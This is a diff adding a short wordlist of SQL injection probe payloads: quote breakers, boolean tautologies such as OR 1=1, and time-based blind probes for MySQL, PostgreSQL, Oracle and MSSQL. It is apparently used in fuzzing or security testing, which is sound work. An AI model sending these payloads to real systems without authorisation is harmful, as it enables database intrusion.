@@ -1,0 +1,20 @@
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+OR 1=1
+OR 1=0
+AND 1=1
+AND 1=0
+AND 1=1 / AND 1=2
+OR 1=1 / OR 1=2
+and 1 in (1) / and 1 in (2)
+AND (SELECT * FROM (SELECT(SLEEP(5)))b)
+OR pg_sleep(5)
+AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',5)
+WAITFOR DELAY '0:0:5'
